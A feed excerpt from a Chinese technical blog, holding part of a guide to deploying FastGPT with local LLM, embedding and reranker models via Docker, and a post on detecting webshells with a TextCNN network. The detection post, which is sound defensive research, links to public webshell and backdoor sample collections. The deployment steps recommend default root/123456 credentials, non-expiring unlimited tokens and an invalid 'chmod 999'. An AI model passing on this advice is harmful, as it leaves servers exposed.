class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 mongo 容器是否正常运行</span></span><br><span class="line">docker ps</span><br><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mongo bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line">mongo -u myname -p mypassword --authenticationDatabase admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化副本集。如果需要外网访问，mongo:27017 可以改成 ip:27017。但是需要同时修改 FastGPT 连接的参数（MONGODB_URI=mongodb://myname:mypassword@mongo:27017/fastgpt?authSource=admin =&gt; MONGODB_URI=mongodb://myname:mypassword@ip:27017/fastgpt?authSource=admin）</span></span><br><span class="line">rs.initiate(&#123;</span><br><span class="line">  _id: <span class="string">&quot;rs0&quot;</span>,</span><br><span class="line">  members: [</span><br><span class="line">    &#123; _id: 0, host: <span class="string">&quot;mongo:27017&quot;</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># 检查状态。如果提示 rs0 状态，则代表运行成功</span></span><br><span class="line">rs.status()</span><br></pre></td></tr></table></figure></li></ul><h2 id="访问-FastGPT"><a href="#访问-FastGPT" class="headerlink" title="访问 FastGPT"></a>访问 FastGPT</h2><ul><li>目前可以通过<code>http://&lt;ip&gt;:8080</code>直接访问(注意防火墙)。登录用户名为<code>root</code>，密码为<code>docker-compose.yml</code>环境变量里设置的<code>DEFAULT_ROOT_PSW</code></li><li>如果需要域名访问，请自行安装并配置 Nginx</li></ul><h1 id="分布式部署"><a href="#分布式部署" class="headerlink" title="分布式部署"></a>分布式部署</h1><h2 id="部署对话大模型"><a href="#部署对话大模型" class="headerlink" title="部署对话大模型"></a>部署对话大模型</h2><ul><li>选择以下其中一种大模型部署即可</li></ul><h3 id="Baichuan2-13B-Chat"><a href="#Baichuan2-13B-Chat" class="headerlink" title="Baichuan2-13B-Chat"></a>Baichuan2-13B-Chat</h3><ul><li><p>推荐配置</p><table><thead><tr><th>类型</th><th>内存</th><th>显存</th><th>硬盘空间</th><th>启动命令</th></tr></thead><tbody><tr><td>fp16</td><td>≥ 32GB</td><td>≥ 28GB</td><td>≥ 50GB</td><td>python openai_api.py</td></tr><tr><td>int8</td><td>≥ 32GB</td><td>≥ 17GB</td><td>≥ 50GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;8）</td></tr><tr><td>int4</td><td>≥ 32GB</td><td>≥ 9GB</td><td>≥ 50GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;4）</td></tr></tbody></table></li><li><p>部署环境要求</p><ul><li>Python 3.10</li><li>NVIDIA 驱动 + CUDA 等套件</li></ul></li><li><p>源码部署</p><ul><li><p>将 Baichuan2-13B-Chat 模型文件下载到本地</p><p>  <a href="https://modelscope.cn/models/baichuan-inc/Baichuan2-13B-Chat">百川2-13B-对话模型</a></p></li><li><p>下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/Baichuan2-13B-Chat/openai_api.py</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/Baichuan2-13B-Chat/requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量<code>SK_KEY</code>，这是大模型调用接口认证 token，防止接口盗用</p></li><li><p>修改<code>openai_api.py</code>文件中模型名称<code>baichuan-inc/Baichuan2-13B-Chat</code>为本地模型所在文件夹</p></li><li><p>运行启动命令<code>python openai_api.py</code></p></li></ul></li></ul><h3 id="Baichuan2-7B-Chat"><a href="#Baichuan2-7B-Chat" class="headerlink" title="Baichuan2-7B-Chat"></a>Baichuan2-7B-Chat</h3><ul><li><p>推荐配置</p><table><thead><tr><th>类型</th><th>内存</th><th>显存</th><th>硬盘空间</th><th>启动命令</th></tr></thead><tbody><tr><td>fp16</td><td>≥ 16GB</td><td>≥ 16GB</td><td>≥ 25GB</td><td>python openai_api.py</td></tr><tr><td>int8</td><td>≥ 16GB</td><td>≥ 9GB</td><td>≥ 25GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;8）</td></tr><tr><td>int4</td><td>≥ 16GB</td><td>≥ 6GB</td><td>≥ 25GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;4）</td></tr></tbody></table></li><li><p>部署环境要求</p><ul><li>Python 3.10</li><li>NVIDIA 驱动 + CUDA 等套件</li></ul></li><li><p>源码部署</p><ul><li><p>将 Baichuan2-7B-Chat 模型文件下载到本地</p><p>  <a href="https://modelscope.cn/models/baichuan-inc/Baichuan2-7B-Chat">百川2-7B-对话模型</a></p></li><li><p>下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/Baichuan2-7B-Chat/openai_api.py</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/Baichuan2-7B-Chat/requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量<code>SK_KEY</code>，这是大模型调用接口认证 token，防止接口盗用</p></li><li><p>修改<code>openai_api.py</code>文件中模型名称<code>baichuan-inc/Baichuan2-7B-Chat</code>为本地模型所在文件夹</p></li><li><p>运行启动命令<code>python openai_api.py</code></p></li></ul></li></ul><h3 id="ChatGLM2-6B"><a href="#ChatGLM2-6B" class="headerlink" title="ChatGLM2-6B"></a>ChatGLM2-6B</h3><ul><li><p>推荐配置</p><table><thead><tr><th>类型</th><th>内存</th><th>显存</th><th>硬盘空间</th><th>启动命令</th></tr></thead><tbody><tr><td>fp16</td><td>≥ 16GB</td><td>≥ 16GB</td><td>≥ 25GB</td><td>python openai_api.py</td></tr><tr><td>int8</td><td>≥ 16GB</td><td>≥ 9GB</td><td>≥ 25GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;8）</td></tr><tr><td>int4</td><td>≥ 16GB</td><td>≥ 6GB</td><td>≥ 25GB</td><td>python openai_api.py（设置环境变量 QUANTIZE_BIT&#x3D;4）</td></tr></tbody></table></li><li><p>部署环境要求</p><ul><li>Python 3.10</li><li>NVIDIA 驱动 + CUDA 等套件</li></ul></li><li><p>源码部署</p><ul><li><p>将 ChatGLM2-6B 模型文件下载到本地</p><p>  <a href="https://modelscope.cn/models/ZhipuAI/chatglm2-6b/">chatglm2-6b</a></p></li><li><p>下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/ChatGLM2-6B/openai_api.py</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Chat/ChatGLM2-6B/requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量<code>SK_KEY</code>，这是大模型调用接口认证 token，防止接口盗用</p></li><li><p>修改<code>openai_api.py</code>文件中模型名称<code>THUDM/chatglm2-6b</code>为本地模型所在文件夹</p></li><li><p>运行启动命令<code>python openai_api.py</code></p></li></ul></li></ul><h2 id="部署-Embedding-模型"><a href="#部署-Embedding-模型" class="headerlink" title="部署 Embedding 模型"></a>部署 Embedding 模型</h2><h3 id="M3E-large"><a href="#M3E-large" class="headerlink" title="M3E-large"></a>M3E-large</h3><ul><li><p>推荐配置</p><table><thead><tr><th>内存</th><th>显存</th><th>硬盘空间</th><th>启动命令</th></tr></thead><tbody><tr><td>≥ 8GB</td><td>≥ 6GB</td><td>≥ 10GB</td><td>python openai_api.py</td></tr></tbody></table></li><li><p>部署环境要求</p><ul><li>Python 3.8</li><li>NVIDIA 驱动 + CUDA 等套件</li></ul></li><li><p>源码部署</p><ul><li><p>将 M3E-large 模型文件下载到本地</p><p>  <a href="https://modelscope.cn/models/Jerry0/M3E-large/">M3E-large</a></p></li><li><p>下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Embedding/M3E-large/openai_api.py</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-Embedding/M3E-large/requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量<code>SK_KEY</code>，这是大模型调用接口认证 token，防止接口盗用</p></li><li><p>修改<code>openai_api.py</code>文件中模型名称<code>moka-ai/m3e-large</code>为本地模型所在文件夹</p></li><li><p>运行启动命令<code>python openai_api.py</code></p></li></ul></li></ul><h2 id="部署-ReRank-重排模型"><a href="#部署-ReRank-重排模型" class="headerlink" title="部署 ReRank 重排模型"></a>部署 ReRank 重排模型</h2><h3 id="BGE-ReRanker-Base"><a href="#BGE-ReRanker-Base" class="headerlink" title="BGE-ReRanker-Base"></a>BGE-ReRanker-Base</h3><ul><li><p>推荐配置</p><table><thead><tr><th>类型</th><th>内存</th><th>显存</th><th>硬盘空间</th><th>启动命令</th></tr></thead><tbody><tr><td>base</td><td>≥ 4GB</td><td>≥ 3GB</td><td>≥ 8GB</td><td>python api.py</td></tr></tbody></table></li><li><p>部署环境要求</p><ul><li>Python 3.10</li><li>NVIDIA 驱动 + CUDA 等套件</li></ul></li><li><p>源码部署</p><ul><li><p>将 BGE-ReRanker-base 模型下载到本地</p><p>  <a href="https://huggingface.co/BAAI/bge-reranker-base">BAAI&#x2F;bge-reranker-base · Hugging Face</a></p></li><li><p>下载相关文件（与存放模型的文件夹在同一级）</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-ReRanker/BGE-ReRanker-base/api.py</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-ReRanker/BGE-ReRanker-base/requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>添加环境变量<code>export ACCESS_TOKEN=XXXXXX</code>配置 token，这里的 token 只是加一层验证，防止接口被人盗用，默认值为<code>ACCESS_TOKEN</code></p></li><li><p>修改<code>api.py</code>文件中<code>bge-reranker-large</code>为存储本地模型文件夹名称</p></li><li><p>运行启动命令<code>python api.py</code></p></li></ul></li></ul><h2 id="部署-OneAPI"><a href="#部署-OneAPI" class="headerlink" title="部署 OneAPI"></a>部署 OneAPI</h2><h3 id="Docker-部署"><a href="#Docker-部署" class="headerlink" title="Docker 部署"></a>Docker 部署</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 SQLite 的部署命令：</span></span><br><span class="line">docker run --name one-api -d --restart always -p <span class="number">3000</span>:<span class="number">3000</span> -e TZ=Asia/Shanghai -v /home/ubuntu/data/one-api:/data justsong/one-api</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 MySQL 的部署命令，在上面的基础上添加 `-e SQL_DSN=&quot;root:123456@tcp(localhost:3306)/oneapi&quot;`，请自行修改数据库连接参数，不清楚如何修改请参见下面环境变量一节。</span></span><br><span class="line"><span class="comment"># 例如：</span></span><br><span class="line">docker run --name one-api -d --restart always -p <span class="number">3000</span>:<span class="number">3000</span> -e SQL_DSN=<span class="string">&quot;root:123456@tcp(localhost:3306)/oneapi&quot;</span> -e TZ=Asia/Shanghai -v /home/ubuntu/data/one-api:/data justsong/one-api</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>其中，-p 3000:3000 中的第一个 3000 是宿主机的端口，可以根据需要进行修改</li><li>数据和日志将会保存在宿主机的<code>/home/ubuntu/data/one-api</code>目录，请确保该目录存在且具有写入权限，或者更改为合适的目录</li><li>如果启动失败，请添加<code>-privileged=true</code></li><li>访问<code>http://&lt;ip&gt;:3000/</code>并登录。初始账号用户名为<code>root</code>，密码为<code>123456</code></li></ul><h3 id="创建令牌"><a href="#创建令牌" class="headerlink" title="创建令牌"></a>创建令牌</h3><ul><li>可设置永不过期，无限额度</li></ul><h3 id="接入本地问答大模型"><a href="#接入本地问答大模型" class="headerlink" title="接入本地问答大模型"></a>接入本地问答大模型</h3><ul><li>类型：OpenAI</li><li>名称：随便写</li><li>模型：自定义模型名称</li><li>代理：本地大模型开放的 OpenAI 格式的 API 接口地址</li></ul><h3 id="接入本地-Embedding-模型"><a href="#接入本地-Embedding-模型" class="headerlink" title="接入本地 Embedding 模型"></a>接入本地 Embedding 模型</h3><ul><li>类型：自定义渠道</li><li>Base URL：Embedding 模型开放的 OpenAI 格式的 API 接口地址</li><li>名称：随便写</li><li>模型：自定义模型名称</li><li>密钥：开放接口定义的密钥</li></ul><h2 id="部署-FastGPT-1"><a href="#部署-FastGPT-1" class="headerlink" title="部署 FastGPT"></a>部署 FastGPT</h2><h3 id="Docker-Compose-快速部署"><a href="#Docker-Compose-快速部署" class="headerlink" title="Docker Compose 快速部署"></a>Docker Compose 快速部署</h3><ul><li><p>依次执行下面命令，创建 FastGPT 文件并拉取docker-compose.yml和config.json，执行完后目录下会有 2 个文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> fastgpt</span><br><span class="line"><span class="built_in">cd</span> fastgpt</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/FastGPT/docker-compose.yml</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/FastGPT/config.json</span><br></pre></td></tr></table></figure><ul><li>注意: docker-compose.yml 配置文件中 Mongo 为 5.x，部分服务器不支持，需手动更改其镜像版本为 4.4.24</li></ul></li><li><p>修改 docker-compose.yml 中的 OPENAI_BASE_URL（API 接口的地址，需要加&#x2F;v1）和CHAT_API_KEY（API 接口的凭证)</p></li><li><p>使用 OneAPI 的话，OPENAI_BASE_URL&#x3D;OneAPI访问地址&#x2F;v1；CHAT_API_KEY&#x3D;令牌</p></li><li><p>修改 config.json 中的本地问答大模型、Embedding 模型以及 ReRank 模型的相关信息</p></li><li><p>在 docker-compose.yml 同级目录下执行</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入项目目录</span></span><br><span class="line"><span class="built_in">cd</span> 项目目录</span><br><span class="line"><span class="comment"># 创建 mongo 密钥</span></span><br><span class="line">openssl rand -<span class="built_in">base64</span> 756 &gt; ./mongodb.key</span><br><span class="line"><span class="comment"># 600不行可以用chmod 999</span></span><br><span class="line"><span class="built_in">chmod</span> 600 ./mongodb.key</span><br><span class="line"><span class="built_in">chown</span> 999:root ./mongodb.key</span><br><span class="line"><span class="comment"># 启动容器</span></span><br><span class="line">docker compose pull</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure></li><li><p>初始化 Mongo 副本集(4.6.8以前可忽略)</p><ul><li>Mongo 数据库需要修改副本集的host，从原来的mongo:27017修改为ip:27017。</li></ul>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 mongo 容器是否正常运行</span></span><br><span class="line">docker ps</span><br><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mongo bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line">mongo -u myname -p mypassword --authenticationDatabase admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化副本集。如果需要外网访问，mongo:27017 可以改成 ip:27017。但是需要同时修改 FastGPT 连接的参数（MONGODB_URI=mongodb://myname:mypassword@mongo:27017/fastgpt?authSource=admin =&gt; MONGODB_URI=mongodb://myname:mypassword@ip:27017/fastgpt?authSource=admin）</span></span><br><span class="line">rs.initiate(&#123;</span><br><span class="line">  _id: <span class="string">&quot;rs0&quot;</span>,</span><br><span class="line">  members: [</span><br><span class="line">    &#123; _id: 0, host: <span class="string">&quot;mongo:27017&quot;</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># 检查状态。如果提示 rs0 状态，则代表运行成功</span></span><br><span class="line">rs.status()</span><br></pre></td></tr></table></figure></li></ul><h3 id="访问-FastGPT-1"><a href="#访问-FastGPT-1" class="headerlink" title="访问 FastGPT"></a>访问 FastGPT</h3><ul><li>目前可以通过 ip:8080 直接访问(注意防火墙)。登录用户名为 root，密码为 docker-compose.yml 环境变量里设置的 DEFAULT_ROOT_PSW</li><li>如果需要域名访问，请自行安装并配置 Nginx</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://fastgpt.in/&quot;&gt;FastGPT&lt;/a&gt; 是一款强大的 LLM + RAG 解决方案，本文记录了基于本地大模型搭建 FastGPT 框架的过程。&lt;/p&gt;</summary>
    
    
    
    <category term="AI" scheme="https://coldwave96.github.io/categories/AI/"/>
    
    <category term="Sites" scheme="https://coldwave96.github.io/categories/AI/Sites/"/>
    
    
    <category term="FastGPT" scheme="https://coldwave96.github.io/tags/FastGPT/"/>
    
    <category term="Docker Compose" scheme="https://coldwave96.github.io/tags/Docker-Compose/"/>
    
  </entry>
  
  <entry>
    <title>基于深度神经网络的Webshell静态检测</title>
    <link href="https://coldwave96.github.io/2024/02/22/WebshellCNN/"/>
    <id>https://coldwave96.github.io/2024/02/22/WebshellCNN/</id>
    <published>2024-02-22T03:40:08.000Z</published>
    <updated>2024-02-22T03:40:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Webshell作为黑客惯用的入侵工具，是以php、asp、jsp、perl、cgi、py等网页文件形式存在的一种命令执行环境。黑客在入侵一个网站服务器后，通常会将webshell后门文件与网站服务器WEB目录下正常网页文件混在一起，通过Web访问webshell后门进行文件上传下载、访问数据库、系统命令调用等各种高危操作，达到非法控制网站服务器的目的，具备威胁程度高，隐蔽性极强等特点。</p><p>本文尝试通过一个 TextCNN + 二分类网络合成的综合深度神经网络实现对于 Webshell 的静态检测。TextCNN 用于处理向量化后的词数组，二分类网络用于处理手动提取的数字化特征（文件的大小以及熵值等等）。</p><span id="more"></span><p>2019年曾经做过一个简单的 Webshell 检测系统。源代码通过 N-Gram 分割的方式，对分割后的字符结合 TF-IDF 技术建立词袋，然后通过简单的机器学习算法如 NB、SVM 等进行二分类。现在的合成网络在利用 TextCNN 深度神经网络自动提取特征的基础上，结合手动设计提取的数字化特征，如文件大小，文件熵等信息，实现综合分类网络，对于一句话木马以及混淆木马有着更好的检测能力。</p><h2 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h2><p>原始数据集采集自 <a href="https://github.com/">Github</a>，下面是详细的仓库列表.</p><h3 id="黑样本"><a href="#黑样本" class="headerlink" title="黑样本"></a>黑样本</h3><ol><li><a href="https://github.com/tennc/webshell">tennc&#x2F;webshell</a></li><li><a href="https://github.com/JohnTroony/php-webshells">JohnTroony&#x2F;php-webshells</a></li><li><a href="https://github.com/xl7dev/webshell">xl7dev&#x2F;webshell</a></li><li><a href="https://github.com/tutorial0/webshell">tutorial0&#x2F;webshell</a></li><li><a href="https://github.com/bartblaze/PHP-backdoors">bartblaze&#x2F;PHP-backdoors</a></li><li><a href="https://github.com/BlackArch/webshells">BlackArch&#x2F;webshells</a></li><li><a href="https://github.com/nikicat/web-malware-collection">nikicat&#x2F;web-malware-collection</a></li><li><a href="https://github.com/fuzzdb-project/fuzzdb">fuzzdb-project&#x2F;fuzzdb</a></li><li><a href="https://github.com/lcatro/PHP-webshell-Bypass-WAF">lcatro&#x2F;PHP-webshell-Bypass-WAF</a></li><li><a href="https://github.com/linuxsec/indoxploit-shell">linuxsec&#x2F;indoxploit-shell</a></li><li><a href="https://github.com/b374k/b374k">b374k&#x2F;b374k</a></li><li><a href="https://github.com/LuciferoO/webshell-collector">LuciferoO&#x2F;webshell-collector</a></li><li><a href="https://github.com/tanjiti/webshell-Sample">tanjiti&#x2F;webshell-Sample</a></li><li><a href="https://github.com/JoyChou93/webshell">JoyChou93&#x2F;webshell</a></li><li><a href="https://github.com/webshellpub/awsome-webshell">webshellpub&#x2F;awsome-webshell</a></li><li><a href="https://github.com/xypiie/webshell">xypiie&#x2F;webshell</a></li><li><a href="https://github.com/leett1/Programe/">leett1&#x2F;Programe&#x2F;</a></li><li><a href="https://github.com/lhlsec/webshell">lhlsec&#x2F;webshell</a></li><li><a href="https://github.com/feihong-cs/JspMaster-Deprecated">feihong-cs&#x2F;JspMaster-Deprecated</a></li><li><a href="https://github.com/threedr3am/JSP-Webshells">threedr3am&#x2F;JSP-Webshells</a></li><li><a href="https://github.com/oneoneplus/webshell">oneoneplus&#x2F;webshell</a></li><li><a href="https://github.com/fr4nk404/Webshell-Collections">fr4nk404&#x2F;Webshell-Collections</a></li><li><a href="https://github.com/mattiasgeniar/php-exploit-scripts">mattiasgeniar&#x2F;php-exploit-scripts</a></li></ol><h3 id="白样本："><a href="#白样本：" class="headerlink" title="白样本："></a>白样本：</h3><ol><li><a href="https://github.com/WordPress/WordPress">WordPress&#x2F;WordPress</a></li><li><a href="https://github.com/yiisoft/yii2">yiisoft&#x2F;yii2</a> </li><li><a href="https://github.com/johnshen/PHPcms">johnshen&#x2F;PHPcms</a></li><li><a href="https://www.kashipara.com/">https://www.kashipara.com</a></li><li><a href="https://github.com/joomla/joomla-cms">joomla&#x2F;joomla-cms</a></li><li><a href="https://github.com/laravel/laravel">laravel&#x2F;laravel</a></li><li><a href="https://github.com/learnstartup/4tweb">learnstartup&#x2F;4tweb</a></li><li><a href="https://github.com/phpmyadmin/phpmyadmin">phpmyadmin&#x2F;phpmyadmin</a></li><li><a href="https://github.com/rainrocka/xinhu">rainrocka&#x2F;xinhu</a></li><li><a href="https://github.com/octobercms/october">octobercms&#x2F;october</a></li><li><a href="https://github.com/alkacon/opencms-core">alkacon&#x2F;opencms-core</a></li><li><a href="https://github.com/craftcms/cms">craftcms&#x2F;cms</a></li><li><a href="https://github.com/croogo/croogo">croogo&#x2F;croogo</a></li><li><a href="https://github.com/doorgets/CMS">doorgets&#x2F;CMS</a></li><li><a href="https://github.com/smarty-php/smarty">smarty-php&#x2F;smarty</a></li><li><a href="https://github.com/source-trace/phpcms">source-trace&#x2F;phpcms</a></li><li><a href="https://github.com/symfony/symfony">symfony&#x2F;symfony</a></li><li><a href="https://github.com/typecho/typecho">typecho&#x2F;typecho</a></li><li><a href="https://github.com/leett1/Programe/">leett1&#x2F;Programe&#x2F;</a></li><li><a href="https://github.com/rpeterclark/aspunit">rpeterclark&#x2F;aspunit</a></li><li><a href="https://github.com/dluxem/LiberumASP">dluxem&#x2F;LiberumASP</a></li><li><a href="https://github.com/aspLite/aspLite">aspLite&#x2F;aspLite</a></li><li><a href="https://github.com/coldstone/easyasp">coldstone&#x2F;easyasp</a></li><li><a href="https://github.com/amasad/sane">amasad&#x2F;sane</a></li><li><a href="https://github.com/sextondb/ClassicASPUnit">sextondb&#x2F;ClassicASPUnit</a></li><li><a href="https://github.com/ASP-Ajaxed/asp-ajaxed">ASP-Ajaxed&#x2F;asp-ajaxed</a></li><li><a href="https://www.codewithc.com/">https://www.codewithc.com</a></li></ol><h3 id="综合数据集"><a href="#综合数据集" class="headerlink" title="综合数据集"></a>综合数据集</h3><p>处理后的综合数据集存放在 <a href="https://huggingface.co/datasets/c01dsnap/Webshell">Hugging Face</a>.</p><h2 id="模型结构"><a href="#模型结构" class="headerlink" title="模型结构"></a>模型结构</h2><p>程序会从指定的文件夹中读取指定类型的文件，计算这些文件的大小和熵值，以及通过 <a href="https://www.nltk.org/">nltk</a> 进行词分割。分割好的词传入 <code>tf.keras.layers.TextVectorization</code> 建立词库并完成向量化，然后传入 TextCNN 网络。文件的大小和熵值通过归一化处理后，传入一个二分类网络。</p><p>其中，TextCNN 网络的结构为输入层，嵌入层，3 个卷积核大小分别为 3、4、5 的卷积层，然后将 3 个卷积层的池化结果拼接后传入全连接层，插入 Dropout 层防止过拟合，最后传入输出层。二分类网络就是简单的 MLP 网络。最后将两个网络连接，获取最终的判断结果。</p><p>网络结构如下：<br><img src="/img/WebshellCNN/WebshellCNN1.png"></p><h2 id="结果评估"><a href="#结果评估" class="headerlink" title="结果评估"></a>结果评估</h2><p>训练过程中的表现如下：<br><img src="/img/WebshellCNN/WebshellCNN2.png"></p><p>模型评估结果如下：<br><img src="/img/WebshellCNN/WebshellCNN3.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;Webshell作为黑客惯用的入侵工具，是以php、asp、jsp、perl、cgi、py等网页文件形式存在的一种命令执行环境。黑客在入侵一个网站服务器后，通常会将webshell后门文件与网站服务器WEB目录下正常网页文件混在一起，通过Web访问webshell后门进行文件上传下载、访问数据库、系统命令调用等各种高危操作，达到非法控制网站服务器的目的，具备威胁程度高，隐蔽性极强等特点。&lt;/p&gt;
&lt;p&gt;本文尝试通过一个 TextCNN + 二分类网络合成的综合深度神经网络实现对于 Webshell 的静态检测。TextCNN 用于处理向量化后的词数组，二分类网络用于处理手动提取的数字化特征（文件的大小以及熵值等等）。&lt;/p&gt;</summary>
    
    
    
    <category term="Program" scheme="https://coldwave96.github.io/categories/Program/"/>
    
    <category term="Python" scheme="https://coldwave96.github.io/categories/Program/Python/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
    <category term="Webshell" scheme="https://coldwave96.github.io/tags/Webshell/"/>
    
  </entry>
  
  <entry>
    <title>智能实体在网络空间自动化防御系统中的应用</title>
    <link href="https://coldwave96.github.io/2023/11/13/IAforID/"/>
    <id>https://coldwave96.github.io/2023/11/13/IAforID/</id>
    <published>2023-11-13T04:07:36.000Z</published>
    <updated>2023-11-13T04:07:36.000Z</updated>
    
